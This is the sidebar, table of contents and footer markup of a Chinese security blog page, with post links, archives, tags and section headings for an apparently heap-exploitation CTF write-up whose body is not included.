href="/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98/">与AI纸上谈兵-CAS的ABA问题</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-12-01T15:17:33.000Z">2024-12-01</time></p><p class="title"><a href="/2024/12/01/Intel-SGX%EF%BC%88Software-Guard-Extensions%EF%BC%89%E9%80%9F%E8%AE%B0/">Intel SGX（Software Guard Extensions）速记</a></p><p class="categories"><a href="/categories/binary/">binary</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-09T14:05:20.000Z">2024-10-09</time></p><p class="title"><a href="/2024/10/09/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%BA%8C%E7%AF%87-BEEP-High-Accuracy-Attack-Provenance-via-Binary-based-Execution-Partition/">APT溯源图构建-论文阅读第二篇-BEEP-High Accuracy Attack Provenance via Binary-based Execution Partition</a></p><p class="categories"><a href="/categories/redteam/">redteam</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-05T15:03:48.000Z">2024-10-05</time></p><p class="title"><a href="/2024/10/05/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%B8%80%E7%AF%87-HOLMES-Real-time-APT-Detection-through-Correlation-of-Suspicious-Information-Flows/">APT溯源图构建-论文阅读第一篇-HOLMES: Real-time APT Detection through Correlation of Suspicious Information Flows</a></p><p class="categories"><a href="/categories/redteam/">redteam</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/01/"><span class="level-start"><span class="level-item">January 2025</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/12/"><span class="level-start"><span class="level-item">December 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">October 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">September 2024</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">August 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/12/"><span class="level-start"><span class="level-item">December 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">October 2019</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/06/"><span class="level-start"><span class="level-item">June 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/04/"><span class="level-start"><span class="level-item">April 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/01/"><span class="level-start"><span class="level-item">January 2018</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2017/10/"><span class="level-start"><span class="level-item">October 2017</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2017/09/"><span class="level-start"><span class="level-item">September 2017</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2017/08/"><span class="level-start"><span class="level-item">August 2017</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/binary/"><span class="tag">binary</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cobaltstrike/"><span class="tag">cobaltstrike</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ebpf/"><span class="tag">ebpf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/economics/"><span class="tag">economics</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/golang/"><span class="tag">golang</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/js/"><span class="tag">js</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kerberos/"><span class="tag">kerberos</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/paper-reading/"><span class="tag">paper reading</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/redteam/"><span class="tag">redteam</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql/"><span class="tag">sql</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/stock/"><span class="tag">stock</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/talking-big/"><span class="tag">talking big</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web-cache/"><span class="tag">web cache</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%82/"><span class="tag">杂</span><span class="tag">2</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#基本信息检查"><span class="level-left"><span class="level-item">1</span><span class="level-item">基本信息检查</span></span></a></li><li><a class="level is-mobile" href="#程序入口点分析"><span class="level-left"><span class="level-item">2</span><span class="level-item">程序入口点分析</span></span></a></li><li><a class="level is-mobile" href="#入口指令恢复"><span class="level-left"><span class="level-item">3</span><span class="level-item">入口指令恢复</span></span></a></li><li><a class="level is-mobile" href="#确定main函数"><span class="level-left"><span class="level-item">4</span><span class="level-item">确定main函数</span></span></a></li><li><a class="level is-mobile" href="#代码阅读与函数名恢复"><span class="level-left"><span class="level-item">5</span><span class="level-item">代码阅读与函数名恢复</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#banner-sub-A77"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">banner(sub_A77)</span></span></a></li><li><a class="level is-mobile" href="#edit-author-name-sub-B6D"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">edit_author_name(sub_B6D)</span></span></a></li><li><a class="level is-mobile" href="#create-book-sub-F55"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">create_book(sub_F55)</span></span></a></li><li><a class="level is-mobile" href="#delete-book-sub-BBD"><span class="level-left"><span class="level-item">5.4</span><span class="level-item">delete_book(sub_BBD)</span></span></a></li><li><a class="level is-mobile" href="#edit-book-sub-E17"><span class="level-left"><span class="level-item">5.5</span><span class="level-item">edit_book(sub_E17)</span></span></a></li><li><a class="level is-mobile" href="#list-book-sub-D1F"><span class="level-left"><span class="level-item">5.6</span><span class="level-item">list_book(sub_D1F)</span></span></a></li><li><a class="level is-mobile" href="#menu-sub-A89"><span class="level-left"><span class="level-item">5.7</span><span class="level-item">menu(sub_A89)</span></span></a></li></ul></li><li><a class="level is-mobile" href="#细读子功能-create-book"><span class="level-left"><span class="level-item">6</span><span class="level-item">细读子功能 create_book</span></span></a></li><li><a class="level is-mobile" href="#细说利用-泄漏libc地址"><span class="level-left"><span class="level-item">7</span><span class="level-item">细说利用 (泄漏libc地址)</span></span></a></li><li><a class="level is-mobile" href="#细说利用-onegadget-getshell"><span class="level-left"><span class="level-item">8</span><span class="level-item">细说利用 (onegadget getshell)</span></span></a></li><li><a class="level is-mobile" href="#细说利用（system）"><span class="level-left"><span class="level-item">9</span><span class="level-item">细说利用（system）</span></span></a></li><li><a class="level is-mobile" href="#附-request2size"><span class="level-left"><span class="level-item">10</span><span class="level-item">附 request2size</span></span></a></li><li><a class="level is-mobile" href="#附-brk起始地址计算方式"><span class="level-left"><span class="level-item">11</span><span class="level-item">附 brk起始地址计算方式</span></span></a></li><li><a class="level is-mobile" href="#附-mmap计算方式"><span class="level-left"><span class="level-item">12</span><span class="level-item">附 mmap计算方式</span></span></a></li><li><a class="level is-mobile" href="#附-固定地址原理"><span class="level-left"><span class="level-item">13</span><span class="level-item">附 固定地址原理</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="李三的剑谱" height="28"></a><p class="is-size-7"><span>&copy; 2025 李三（cl0und）</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>